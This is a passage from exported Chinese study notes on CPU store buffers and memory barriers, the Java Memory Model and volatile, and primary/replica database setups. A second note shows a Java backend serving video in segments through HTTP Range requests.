对内存进行操作的时候，顺序和程序代码指令顺序不一致。在写操作执行之前就先执行了读操作。另一个原因是在同一个 CPU 中同一个数据存在不一致的情况 ， 在 store buffer 中是最新的数据， 在 cache line 中是旧的数据。为了解决在同一个 CPU 的 store buffer 和 cache 之间数据不一致的问题，引入了 Store Forwarding。store forwarding 就是当 CPU 执行读操作时，会从 store buffer 和 cache 中读取数据， 如果 store buffer 中有数据会使用 store buffer 中的数据，这样就解决了同一个 CPU 中数据不一致的问题。**但是一个cpu是只能访问另一个cpu中的cache，而不能访问到另一个cpu中的store buffer的**，所以依然会引入新的问题，如下：\n```java\n//CPU 0执行foo(), 拥有b的Cache Line, 初始值是0\nvoid foo(){\n  a = 1;\n  b = 1;\n}\n//CPU 1执行bar(), 拥有aCache Line, 初始值是0\nvoid bar(){\n  while(b == 0) continue;\n  assert(a == 1);\n}\n```\n执行流程：\n1. CPU 0执行a=1的赋值操作，由于a不在cache中，因此，CPU 0将a值放到store buffer中之后，发送了read invalidate命令到总线上去。\n2. CPU 1执行 while (b == 0) 循环，由于b不在CPU 1的cache中，因此，CPU发送一个read message到总线上，看看是否可以从其他cpu的cache中或者memory中获取数据。\n3. CPU 0继续执行b=1的赋值语句，由于b就在自己的local cache中（cacheline处于modified状态或者exclusive状态），因此CPU0可以直接操作将新的值1写入cache line。\n4. CPU 0收到了read message，将最新的b值”1“回送给CPU 1，同时将b cacheline的状态设定为shared。\n5. CPU 1收到了来自CPU 0的read response消息，将b变量的最新值”1“值写入自己的cacheline，状态修改为shared。\n6. 由于b值等于1了，因此CPU 1跳出while (b == 0)的循环，继续执行。\n7. CPU 1执行assert(a == 1)，这时候CPU 1的local cache中还是旧的a值，因此assert(a == 1)失败。\n8. CPU 1收到了来自CPU 0的read invalidate消息，以a变量的值进行回应，同时清空自己的cacheline。\n9. CPU 0收到了read response和invalidate ack的消息之后，将store buffer中的a的最新值”1“数据写入cacheline。\n\n产生问题的原因是 CPU 0 对 a 的写操作还没有执行完，但是 CPU 1 对 a 的读操作已经执行了。毕竟CPU并不知道哪些变量有相关性，这些变量是如何相关的。不过CPU设计者可以间接提供一些工具让软件工程师来控制这些相关性。这些工具就是**memory barrier 指令**。要想程序正常运行，必须增加一些 memory barrier 的操作。\n\n### Store Memory Barrier（写内存屏障）\n```java\n//CPU 0执行foo(), 拥有b的Cache Line, 初始值是0\nvoid fun1() {   \n  a = 1;   \n  smp_mb();   \n  b = 1;\n}\n \n//CPU 1执行fun2(), 拥有aCache Line, 初始值是0\nvoid fun2() {   \n  while (b == 0) continue;\n  assert(a == 1);\n}\n``` \n\nsmp_mb() 这个内存屏障的操作会在执行后续的store操作之前，首先flush store buffer（也就是将之前的值写入到cacheline中）。smp_mb() 操作主要是为了让数据在local cache中的操作顺序是符合program order的顺序的，为了达到这个目标有两种方法：方法一就是让CPU stall，直到完成了清空了store buffer（也就是把store buffer中的数据写入cacheline了）。方法二是让CPU可以继续运行，不过需要在store buffer中做些文章，也就是要记录store buffer中数据的顺序，在将store buffer的数据更新到cacheline的操作中，严格按照顺序执行，即便是后来的store buffer数据对应的cacheline已经ready，也不能执行操作，要等前面的store buffer值写到cacheline之后才操作。增加smp_mb() 之后，操作顺序如下：\n1. CPU 0执行a=1的赋值操作，由于a不在local cache中，因此，CPU 0将a值放 store buffer中之后，发送了read invalidate命令到总线上去。\n2. CPU 1执行 while (b == 0) 循环，由于b不在CPU 1的cache中，因此，CPU发送一个read message到总线上，看看是否可以从其他cpu的local cache中或者memory中获取数据。\n3. CPU 0执行smp_mb()函数，给目前store buffer中的所有项做一个标记（后面我们称之marked entries）。当然，针对我们这个例子，store buffer中只有一个marked entry就是“a=1”。\n4. CPU 0继续执行b=1的赋值语句，虽然b就在自己的local cache中（cacheline处于modified状态或者exclusive状态），不过在store buffer中有marked entry，因此CPU0并没有直接操作将新的值1写入cache line，取而代之是b的新值”1“被写入store buffer，当然是unmarked状态。\n5. CPU 0收到了read message，将b值”0“（新值”1“还在store buffer中）回送给CPU 1，同时将b cacheline的状态设定为shared。\n6.  CPU 1收到了来自CPU 0的read response消息，将b变量的值（”0“）写入自己的cacheline，状态修改为shared。\n7. 完成了bus transaction之后，CPU 1可以load b到寄存器中了（local cacheline中已经有b值了），当然，这时候b仍然等于0，因此循环不断的loop。虽然b值在CPU 0上已经赋值等于1，但是那个新值被安全的隐藏在CPU 0的store buffer中。\n8. CPU 1收到了来自CPU 0的read invalidate消息，以a变量的值进行回应，同时清空自己的cacheline。\n9. CPU 0将store buffer中的a值写入cacheline，并且将cacheline状态修改为modified状态。\n10. 由于store buffer只有一项marked entry（对应a=1），因此，完成step 9之后，store buffer的b也可以进入cacheline了。不过需要注意的是，当前b对应的cacheline的状态是shared。\n11.  CPU 0发送invalidate消息，请求b数据的独占权。\n12.  CPU 1收到invalidate消息，清空自己的b cacheline，并回送acknowledgement给CPU 0。\n13. CPU 1继续执行while (b == 0)，由于b不在自己的local cache中，因此 CPU 1发送read消息，请求获取b的数据。\n14. CPU 0收到acknowledgement消息，将b对应的cacheline修改成exclusive状态，这时候，CPU 0终于可以将b的新值1写入cacheline。\n15. CPU 0收到read消息，将b的新值1回送给CPU 1，同时将其local cache中b对应的cacheline状态修改为shared。\n16.  CPU 1获取来自CPU 0的b的新值，将其放入cacheline中。\n17. 由于b值等于1了，因此CPU 1跳出while (b == 0)的循环，继续执行。\n18. CPU 1执行assert(a == 1)，不过这时候a值没有在自己的cacheline中，因此需要通过cache一致性协议从CPU 0那里获得，这时候获取的是a的最新值，也就是1值，因此assert成功。\n\n通过上面的描述，我们可以看到，一个直观上很简单的给a变量赋值的操作，都需要那么长的执行过程，而且每一步都需要芯片参与，最终完成整个复杂的赋值操作过程。\n\n**上述这个例子展示了 write memory barrier , 简单来说在屏障之后的写操作必须等待屏障之前的写操作完成才可以执行，读操作则不受该屏障的影响。**\n\n**读内存屏障 Load Memory Barrier就不详细说明了**\n\n**总结**\n**Write Barrier**\nStore/Write屏障，是x86的”sfence“指令，屏障之后的写操作必须等待屏障之前的写操作完成才可以执行，读操作则不受该屏障的影响\n\n**Load Barrier**\nLoad屏障，是x86上的”ifence“指令，屏障之后的读操作必须等待屏障之前的读操作完成才可以执行，写操作则不受该屏障的影响\n\n**Full Barrier**\nFull屏障，是x86上的”mfence“指令，复合了load和write屏障的功能。\n\n\n# Java 内存模型（Java Memory Model）\n上述我们了解了硬件底层并发问题，上述只是针对某个cpu架构来谈并发问题的，针对不同的cpu架构，所产生的并发问题是不同的。所以Java虚拟机规范中试图定义一种Java内存模型（Java Memory Model，JMM）**来屏蔽掉各种硬件和操作系统的内存访问差异（所以在写java代码时，<font color=\"red\">应该要严格面向jvm，而不是面向底层硬件</font>）**，以实现让Java程序在各种平台下都能达到一致的内存访问效果。在此之前，主流程序语言（如C/C++等）直接使用物理硬件和操作系统的内存模型，因此，会由于不同平台上内存模型的差异，有可能导致程序在一套平台上并发完全正常，而在另外一套平台上并发访问却经常出错，因此在某些场景就必须针对不同的平台来编写程序。\n\n**java内存模型的主要目标是定义程序中各个变量的访问规则，即在虚拟机中将变量存储到内存和从内存中取出变量这样的底层细节**。此处的变量（Variables）与Java编程中所说的变量有所区别，它包括了实例字段、静态字段和构成数组对象的元素，但不包括局部变量与方法参数，因为后者是线程私有的，不会被共享，自然就不会存在竞争问题。为了获得较好的执行效能，Java内存模型并没有限制执行引擎使用处理器的特定寄存器或缓存来和主内存进行交互，也没有限制即时编译器进行调整代码执行顺序这类优化措施。\nJava内存模型规定了所有的变量都存储在主内存（Main Memory）中。每条线程还有自己的工作内存（Working Memory），线程的工作内存中保存了被该线程使用到的变量的主内存副本拷贝（不是全部拷贝），线程对变量的所有操作（读取、赋值等）都必须在工作内存中进行，而不能直接读写主内存中的变量。不同的线程之间也无法直接访问对方工作内存中的变量，线程间变量值的传递均需要通过主内存来完成。线程、主内存、工作内存三者的交互关系如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122903.png)\n\n- read 读取，作用于主内存把变量从主内存中读取到本本地内存。\n- load 加载，主要作用本地内存，把从主内存中读取的变量加载到本地内存的变量副本中\n- use 使用，主要作用本地内存，把工作内存中的一个变量值传递给执行引擎，每当虚拟机遇到一个需要使用变量的值的字节码指令时将会执行这个操作。、\n- assign 赋值 作用于工作内存的变量，它把一个从执行引擎接收到的值赋值给工作内存的变量，每当虚拟机遇到一个给变量赋值的字节码指令时执行这个操作。\n- store 存储 作用于工作内存的变量，把工作内存中的一个变量的值传送到主内存中，以便随后的write的操作。\n- write 写入 作用于主内存的变量，它把store操作从工作内存中一个变量的值传送到主内存的变量中。\n- lock 锁定 ：作用于主内存的变量，把一个变量标识为一条线程独占状态。\n- unlock 解锁：作用于主内存变量，把一个处于锁定状态的变量释放出来，释放后的变量才可以被其他线程锁定。\n所以看似简单的通信其实是这八种状态来实现的。\n同时在Java内存模型中明确规定了要执行这些操作需要满足以下规则：\n- 不允许read和load、store和write的操作单独出现。\n- 不允许一个线程丢弃它的最近assign的操作，即变量在工作内存中改变了之后必须同步到主内存中。\n- 不允许一个线程无原因地（没有发生过任何assign操作）把数据从工作内存同步回主内存中。\n- 一个新的变量只能在主内存中诞生，不允许在工作内存中直接使用一个未被初始化（load或assign）的变量。即就是对一个变量实施use和store操作之前，必须先执行过了assign和load操作。\n- 一个变量在同一时刻只允许一条线程对其进行lock操作，lock和unlock必须成对出现\n- 如果对一个变量执行lock操作，将会清空工作内存中此变量的值，在执行引擎使用这个变量前需要重新执行load或assign操作初始化变量的值\n- 如果一个变量事先没有被lock操作锁定，则不允许对它执行unlock操作；也不允许去unlock一个被其他线程锁定的变量。\n- 对一个变量执行unlock操作之前，必须先把此变量同步到主内存中（执行store和write操作）。\n\n这里所讲的主内存、工作内存与Java内存区域中的Java堆、栈、方法区等并不是同一个层次的内存划分，这两者基本上是没有关系的，如果两者一定要勉强对应起来，那从变量、主内存、工作内存的定义来看，主内存主要对应于java堆中的对象实例数据部分，而工作内存则对应于虚拟机栈中的部分区域。从更低层次上说，主内存就直接对应于物理硬件的内存，而为了获取更好的运行速度，虚拟机（甚至是硬件系统本身的优化措施）可能会让工作内存优先存储于寄存器和高速缓存中，因为程序运行时主要访问读写的是工作内存\n\n**JMM模型下的线程间通信：**\n线程间通信必须要经过主内存。\n如下，如果线程A与线程B之间要通信的话，必须要经历下面2个步骤：\n- 线程A把本地内存A中更新过的共享变量刷新到主内存中去。\n- 线程B到主内存中去读取线程A之前已更新过的共享变量。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122914.png)\n\n**JMM 是一套规则呀，它只会给你定义规范，模型，具体的实现是由JVM来解决的！理解这一点很重要。**\n\n## volatile\n### 实现变量可见性\n可见性是指线程之间的可见性，一个线程修改的状态对另一个线程是可见的。也就是一个线程修改的结果，另一个线程马上就能看到。\n当一个变量定义为volatile之后，当一条线程修改了这个变量的值，新值对于其他线程来说是可以立即得知的。而普通变量不能做到这一点，普通变量的值在线程间传递均需要通过主内存来完成，例如，线程A修改一个普通变量的值，然后向主内存进行回写，另外一条线程B在线程A回写完成了之后再从主内存进行读取操作，新变量值才会对线程B可见。\n\n**valatile的底层实现**\n底层实现主要是通过`汇编lock前缀指令`，这个汇编指令会锁定这块内存区域的缓存(缓存行锁定)并**立即**回写到主内存\nIA-32和Intel 64架构软件开发者手册对lock指令的解释：\n- 会将当前处理器缓存行(cache line)的数据<font color=\"red\">立即</font>写回到内存中\n- 这个写会内存的操作会引起在其他cpu里缓存了该内存地址的数据无效(类似MESI协议) \n- 提供内存屏障功能，是lock前后指令不能重排序\n\n### 非原子性\n注：**由于java里面的运算并非原子操作，导致volatile变量的运算在并发下一样是不安全的**，我们可以通过下面代码验证：\n```java\npublic class VolatileTest{\n\n  public static volatile int race = 0;\n\n  public static void increase(){\n    race++;\n  }\n\n  public static void main(String[] args){\n    for(int i = 0; i < 20; i++){\n      Thread th = new Thread(() -> {\n        for(int j = 0; j < 10000; j++){\n          increase();\n        }\n      });\n      th.start();\n    }\n\n    while(Thread.activeCount() > 1){\n      Thread.yield();\n    }\n\n    System.out.println(race);\n  }\n}\n```\n这段代码发起了20个线程，每个线程对race变量进行1000次自增操作，如果这段代码能够正确并发的话，最后输出的结果应该是200000。读者运行完这段代码之后，并不会获得期望的结果，而且会发现每次运行程序，输出的结果都不一样，都是一个小于200000的数字，这是为什么呢？\n问题就出现在自增运算“race++”之中，我们用Javap反编译这段代码后发现只有一行代码的increase()方法在Class文件中是由4条字节码指令构成的，从字节码层面上很容易就分析出并发失败的原因了：当getstatic指令把race的值取到操作栈顶时，volatile关键字保证了race的值在此时是正确的，但是在执行iconst_1、iadd这些指令的时候，其他线程可能已经把race的值加大了，而在操作栈顶的值就变成了过期的数据，所以putstatic指令执行后可能把较小的race值同步会主存之中。\n\n由于volatile变量只能保证可见性，在不符合以下两条规则的运算场景中，我们仍然要通过加锁（使用synchronized或java.util.concurrent中的原子类）来保证原子性。\n- 运算结果并不依赖变量的当前值，或者能够确保只有单一的线程修改变量的值。\n- 变量不需要与其他的状态变量共同参与不变约束。\n\n### 禁止指令重排\n在程序运行时，为了提升指令的执行效率，编译器重新排序，达到最佳效果。 \n指令的重排序分为编译期重排和运行期重排。\n编译期重排是编译器依据对上下文的分析，对指令进行重排序，使其更适合于CPU的并行执行。\n编译器重排序：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122925.png)\n\nCPU只读一次的x和y值。不需反复读取寄存器来交替x和y值。编译器的重排序是为了更加高效的使用处理器。\n\n**编译器重排序时会考虑指令的依赖性：**\n1. 数据依赖性\n如果两个操作访问同一个变量，且这两个操作中有一个为写操作，此时这两个操作之间就存在数据依赖性。数据依赖分为下列3种类型，这3种情况，只要重排序两个操作的执行顺序，程序的执行结果就会被改变。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122934.png)\n\n2. 控制依赖性\nflag变量是个标记，用来标识变量a是否已被写入，在use方法中变量i依赖if (flag)的判断，这里就叫控制依赖，如果发生了重排序，结果就不对了。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122943.png)\n\n由于上面两种依赖性的存在，从而产生了as-if-serial 语义\n为了不管如何重排序，都必须保证代码在单线程下的运行正确，连单线程下都无法正确，更不用讨论多线程并发的情况，所以就提出了一个as-if-serial的概念\ns-if-serial 语义的意思是：不管怎么重排序（编译器和处理器为了提高并行度），（单线程）程序的执行结果不能被改变。编译器、runtime和处理器都必须遵守as-if-serial语义。为了遵守as-if-serial语义，编译器和处理器不会对存在数据依赖关系的操作做重排序，因为这种重排序会改变执行结果。但是，如果操作之间不存在数据依赖关系，这些操作依然可能被编译器和处理器重排序。\nas-if-serial 并没有禁止存在控制依赖的指令进行重排序，因为控制依赖会降低流水线的并行度，所以处理器层面在处理条件分支时会采用猜测执行/流水线冒险来对分支指令进行预测执行，并在执行完成后对分支条件进行检查和校验冒险结果。所以无论是否重排序，处理器都会对其正确性进行检验。\n\n而对于处理器执行指令时，为了使流水线的效率最大化，也会动态的根据依赖部件的效能对指令进行进一步的重排序。所以代码顺序并不是真正的执行顺序，只要有空间提高性能，CPU和编译器可以进行各种优化。\n\n这种以提升执行效率为目的的重排序可能会带来意想不到的后果。为了在必要的时候避免重排序的发生，硬件为我们提供了**内存屏障机制**， 而volatile就是采用这个内存屏障机制来避免指令重排。\n\nvolatile变量在写操作之后会插入一个write屏障，在读操作之前会插入一个load屏障。一个类的final字段会在初始化后插入一个write屏障，来确保final字段在构造函数初始化完成并可被使用时可见。\n\n# volatile和缓存一致性协议 mesi的关系\n首先强调一点，volatile和mesi这两个东西没有半点关系。mesi是缓存一致性的一种实现手段，多核CPU为了保证缓存数据的一致性，通常有两种实现手段，一种是总线锁，另一种是缓存锁。总线锁性能消耗大，缓存锁则一般通过缓存一致性来实现。因此我们知道mesi是CPU硬件级别的。 volatile是JAVA的一种关键字，实现了两个功能： 1.可见性 2.禁止乱序。 禁止乱序，在JVM层面使用内存屏障来实现，汇编级别通过lock #指令来实现。不管cpu有没有mesi协议，用了volatile，JVM都会保证可见性，只不过实现方式是不一样的\n\n问题：既然CPU有了MESI协议可以保证cache的一致性，那么为什么还需要volatile这个关键词来保证可见性(内存屏障)？或者是只有加了volatile的变量在多核cpu执行的时候才会触发缓存一致性协议？\n\n答案是：还是有用的，就算在实现了mesi的cpu上，volatile一样不可或缺。除了禁止指令重排序的作用外，由于mesi只是保证了L1-3的cache之间的可见性，而cpu的并不是直接把数据写入L1 cache的，中间还可能有store buffer。有些arm和power架构的cpu还可能有load buffer或者invalid queue等等。因此，有MESI协议远远不够。而volatile规范保证了对它修饰的变量的写指令会使得当前cpu所有缓存写到被mesi保证可见性的L1-3cache中,然后触发MESI。（具体的实现，以X86体系为例，volatile会被JVM生成带lock前缀的指令）。\n\n# 主备 主从 主主模式\n单点故障的情况不可避免，而且单副本的存储方案早已无法满足业务的可靠性要求，因此一般情况下我们至少也会上个双机存储架构。凡事最好有个plan B。\n## 主备\n主：主机，备：备机。\n主机的意思当然是以它为主了，读写都是主机上，而备机呢就是备用，默默的在背后吸收主机的数据，时刻待命着等待主机挂了之后取而代之(没这么坏哈哈)。因此在主机还活着的情况下，备机的唯一使命就是同步主机的数据，不对外提供服务。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122953.png)\n\n优点：简单，主备之间只有数据同步，不需要考虑别的情况。就很简单的配置一下，再搞一台服务器就能组成主备架构了。\n缺点：备机等于就拿来备份，浪费了备机这台服务器的资源。上面说的不考虑别的情况指的是主机和备机它们两之间就只要复制数据，但是有些情况我们人还是得考虑的：主机挂了如何让备机上。\n有三种选择\n- 人工切换。人工切换时效性不高，出了事情首先你得开机，登录远程一阵啪啪得好几分钟或者万一你在LOL，黑铁晋级青铜最后一把努力了几个月即将晋升倔强青铜的一刻！是吧。还要万一在深夜或者说....是吧。\n- 引入中间件。例如ZooKeeper、keepalived。就跟好多房东把房子委托给中介一样，这中间件就是个中介。全权由中介来打理主机和备机，它会根据机子状态来判别这时候是不是该备机上了。(建议)\n- 主机备机之间状态传输(咱不找中介了，自己来打理)，啥意思呢？就是除数据同步，主备之间还要有个状态传输过程，来让备机只要现在主机过得好不好，可以是主机主动推送它的状态给备机，或者是备机去索要状态。当状态拿不到或者不对的时候就开始主备切换。但是可能传输出现了波动啥的，导致备机误判了，然后备机升级为主机，这样就两主机了(下面会说主主的问题)。\n\n## 主从\n主：主机，从：从机\n从机和备机的区别在于它得除了同步数据之外还得干活，对外提供读的操作，你可以理解为它是仆从。但是仆从和备机一样也有翻身做主人的一天，所以它也在默默的等待着主机挂了，取而代之。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123002.png)\n\n优点：充分利用了资源，嘿嘿不想备机这么爽了，还得出来干活，对外提供读操作。而且在主机挂了的时候，如果没任命新机主之前，读操作还是能用的。\n缺点：\n- 客户端需要多个判断，也就是不同操作需要发放给不同服务器，我上图主机提供读写，有时候读写分离了，主机就提供写。\n- 主从延迟，读操作分配给从库，就会存在数据同步的延迟问题，比如某个人注册了账号之后，登录走的是从机，这时候数据还未从主机同步过来，那可不让人很难受了。有关主从延迟问题的一些解决办法\n- 和主备一样的切换问题。(参考主备)\n\n## 主主\n主主就是两台都是主机。同时对外提供读写操作。客户端任意访问提供的一台。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123014.png)\n\n优点：主主的好处就是可以把写操作也分担一下，但是问题恰恰就出在写操作上，导致主主的架构有很大的局限性。\n缺点：例如主机A有个注册的插入操作，生成的id是50，同一时刻主机B也有个插入操作生成的id也是50。然后它们之间的数据同步了，你说是谁覆盖谁呢？谁覆盖谁都不对！\n因此主主只适用于可以双向复制，覆盖的数据(例如用户登录生成的token)。但是我们平日里绝大部分的数据都不允许。\n"
  },
  {
    "title": "./notes/back-end/java视频流操作.md",
    "body": "# Java后端实现视频分段渐进式播放\n## 为什么需要分段播放？\n如果一个视频文件很大，例如一部1GB的电影，服务端直接将整个文件响应给客户端是会抛异常的，浏览器也没办法一下子接收这么大的文件，视频播放会出问题。\n其次，直接响应一个完整的视频，无疑会浪费服务器的带宽，用户点击播放，很少会完整的观看完视频，可能看一下片头不感兴趣就不看了，亦或是想直接快进到高潮部分，跳过前面的情节等等，服务端应该根据用户的需求，只响应用户真正需要的视频片段就可以了。\n服务器带宽是很珍贵的稀缺资源，应该尽可能的节约。\n\n## Http请求头Range\nRange请求头是HTTP1.1才加入的，它为并行下载以及断点续传提供了技术支持。\n如下是一个HTTP请求头示例：\n```\nAccept: */*\nAccept-Encoding: identity;q=1, *;q=0\nAccept-Language: zh-CN,zh;q=0.9\nConnection: keep-alive\nHost: localhost:8080\nRange: bytes=0-1024\n```\nRange请求头的意思是告诉服务端，这次请求客户端只需要资源的第0-1024个字节的区间数据，服务端只需要响应这部分数据就可以了。\n\n**原理：**\n使用`<video>`标签的src属性指向服务器链接，当服务器响应的HTTP状态码为206时，浏览器会自动开启分段式播放，在每次的HTTP请求头中**自动加入**Range请求头，服务端**只需要**根据前端传过来的Range信息截取视频的指定区间来响应即可。\n\n## 实战：\n前端：\n```html\n<html lang=\"en\">\n<head>\n\t<meta charset=\"UTF-8\">\n\t<title></title>\n</head>\n<body>\n  <video controls> //一定要加controls\n    <source src=\"/play\" type=\"video/mp4\">\n  </video>\n  <!-- 或 -->\n  <!-- <video src=\"/play\" controls> -->\n  <!-- </video> -->\n</body>\n</html>\n```\n后端：\n```java\n\t@GetMapping(\"play\")\n\tpublic void play(HttpServletRequest request, HttpServletResponse response) throws IOException {\n\t\tresponse.reset();\n\t\tFile file = new File(this.getClass().getResource(\"/static/322185980-1-16.mp4\").getPath());\n\t\tlong fileLength = file.length();\n\t\t// 随机读文件\n\t\tRandomAccessFile randomAccessFile = new RandomAccessFile(file, \"r\");\n\n\t\t//获取从那个字节开始读取文件\n\t\tString rangeString = request.getHeader(\"Range\");\n\t\tlong range=0;\n    if (StrUtil.isNotBlank(rangeString)) {\n\t\t\trange = Long.valueOf(rangeString.substring(rangeString.indexOf(\"=\") + 1, rangeString.indexOf(\"-\")));\n\t\t}\n\t\t//获取响应的输出流\n\t\tOutputStream outputStream = response.getOutputStream();\n\t\t//设置内容类型\n\t\tresponse.setHeader(\"Content-Type\", \"video/mp4\");\n\t\t//返回码需要为206，代表只处理了部分请求，响应了部分数据\n\t\tresponse.setStatus(HttpServletResponse.SC_PARTIAL_CONTENT);\n\n\t\t// 移动访问指针到指定位置\n\t\trandomAccessFile.seek(range);\n\t\t// 每次请求只返回1MB的视频流\n\t\tbyte[] bytes = new byte[1024 * 1024];\n\t\tint len = randomAccessFile.read(bytes);\n\t\t//设置此次相应返回的数据长度\n\t\tresponse.setContentLength(len);\n\t\t//设置此次相应返回的数据范围,  Content-Range的格式为[要下载的开始位置]-[结束位置]/[文件总大小]；\n\t\tresponse.setHeader(\"Content-Range\", \"bytes \"+range+\"-\"+(fileLength-1)+\"/\"+fileLength);\n\t\t// 将这1MB的视频流响应给客户端\n\t\toutputStream.write(bytes, 0, len);\n\t\toutputStream.close();\n\t\trandomAccessFile.close();\n\n\t\tSystem.out.println(\"返回数据区间:【\"+range+\"-\"+(range+len)+\"】\");\n\t}\n```\n读取视频文件的指定位置数据，主要还是用到了JDK提供的java.io.RandomAccessFile类\n视频的请求过程是这样的：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122308.png)\n\n后端控制台输出：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122317.png)\n"
  }
]